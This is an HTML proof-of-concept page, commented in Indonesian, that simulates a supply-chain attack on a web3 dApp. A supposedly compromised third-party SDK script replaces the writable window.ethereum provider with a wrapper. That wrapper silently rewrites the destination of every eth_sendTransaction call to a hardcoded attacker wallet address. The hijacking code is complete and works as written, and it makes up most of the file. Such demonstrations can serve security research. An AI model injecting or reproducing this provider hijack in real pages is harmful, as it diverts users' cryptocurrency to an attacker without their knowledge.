<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Production dApp Environment</title>
</head>
<body>

    <!-- 
      =============================================================
      1. KODE UTAMA DAPP RESMI (Dibuat oleh Developer Asli & Bersih)
      =============================================================
    -->
    <script>
        // Simulasi fungsi dApp resmi yang memanggil transaksi ke smart contract sah
        async function executeOfficialDAppAction() {
            try {
                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                console.log("dApp: Mengirim transaksi ke smart contract resmi...");
                
                // Developer asli menetapkan alamat tujuan ke kontrak sah (misal: Pool Resmi)
                await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: accounts[0],
                        to: "0x1234567890abcdef1234567890abcdef12345678", 
                        value: "0x0"
                    }]
                });
            } catch (err) {
                console.error("dApp Error:", err.message);
            }
        }
    </script>


    <!-- 
      =============================================================
      2. SKRIP PIHAK KETIGA / SDK EKSTERNAL YANG TERKOMPROMISI
      (Mensimulasikan skrip widget/analitik luar yang dimuat oleh dApp)
      =============================================================
    -->
    <script>
        (function compromisedThirdPartySDK() {
            console.log("[*] Skrip pihak ketiga/SDK eksternal dimuat ke dalam dApp...");

            if (!window.ethereum) return;

            // Memeriksa apakah peramban membiarkan objek global bersifat writable
            const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
            if (!descriptor || !descriptor.writable) {
                console.log("[-] Proteksi aktif: window.ethereum bersifat immutable.");
                return;
            }

            const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
            const trustedProvider = window.ethereum;

            // Memanfaatkan sifat writable: true untuk membajak fungsi transaksi secara senyap
            window.ethereum = {
                selectedAddress: trustedProvider.selectedAddress,
                chainId: trustedProvider.chainId,
                request: async function(args) {
                    if (args.method === "eth_sendTransaction" && args.params?.[0]) {
                        console.warn(`[!] Intersepsi: Target asli (${args.params[0].to}) dibelokkan!`);
                        // Mengalihkan parameter tujuan dana secara diam-diam ke dompet penyerang
                        args.params[0].to = attackerWallet;
                    }
                    return trustedProvider.request(args);
                }
            };

            console.log("[+] Berhasil membajak window.ethereum via skrip pihak ketiga.");
        })();
    </script>


    <!-- Simulasi pemicu aksi oleh pengguna pada dApp -->
    <button onclick="executeOfficialDAppAction()"> Jalankan Transaksi dApp </button>

</body>
</html>
